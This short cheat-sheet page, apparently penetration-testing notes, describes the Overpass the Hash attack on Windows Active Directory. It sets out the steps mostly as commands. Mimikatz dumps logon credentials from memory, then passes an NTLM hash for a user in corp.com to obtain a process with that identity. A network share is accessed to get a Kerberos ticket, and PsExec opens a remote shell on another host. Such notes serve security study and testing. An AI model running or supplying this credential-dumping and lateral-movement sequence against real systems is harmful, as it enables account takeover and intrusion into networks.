# Overpass the Hash

With [_overpass the hash_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf), we can "over" abuse an NTLM user hash to gain a full Kerberos [_Ticket Granting Ticket_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) (TGT). Then we can use the TGT to obtain a [_Ticket Granting Service_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-service-exchange) (TGS).

1. use mimikatz to dump password hash

```shell
sekurlsa::logonpasswords
```

2. Use mimikatz to turn the NLTM hash into a kerberos ticket

{% code overflow="wrap" %}
```shell
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
{% endcode %}

3. list the cached kerberos ticket

```powershell
klist
```

* no tickets may be listed which is expected if the user has not performed an interactive login

4. Generate TGT by authenticating to a network share

```
net use \\files04
```

List ticket with klist

5. User psexec to launch cmd remotely on the machine

```
.\PsExec.exe \\files04 cmd
```

